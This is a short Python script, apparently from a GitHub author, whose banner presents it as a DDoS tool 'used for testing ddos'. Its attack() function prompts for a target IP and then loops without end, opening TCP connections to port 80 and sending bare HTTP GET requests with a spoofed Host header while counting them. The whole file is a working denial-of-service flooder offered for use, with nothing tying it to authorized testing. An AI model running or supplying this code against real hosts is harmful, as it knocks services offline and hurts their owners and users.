
version= '2.0'
title = '''

    _     __  __  ___  _   _           ____   _   _   ____  ____   ____             ____  ___  _____
   / \   |  \/  ||_ _|| \ | |         |  _ \ | \ | | / ___|| __ ) |  _ \           / ___||_ _||_   _|
  / _ \  | |\/| | | | |  \| |  _____  | |_) ||  \| || |  _ |  _ \ | |_) |  _____  | |  _  | |   | |
 / ___ \ | |  | | | | | |\  | |_____| |  _ < | |\  || |_| || |_) ||  _ <  |_____| | |_| | | |   | |
/_/   \_\|_|  |_||___||_| \_|         |_| \_\|_| \_| \____||____/ |_| \_\          \____||___|  |_|


 DDos python script | Script used for testing ddos | Ddos attack     
 Author: aminrngbr                                                
 Github: http://github.com/aminrngbr1122                          
 Version:'''+version+''' 
'''

import socket

attack_num = 0

print(title)

# ----------------------------------------------------------------------------------------

def attack():
  target = input("ip target :")
  fake_ip = '182.21.20.32'
  port = 80
  while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

# -------------------------------------------------------------------------------------------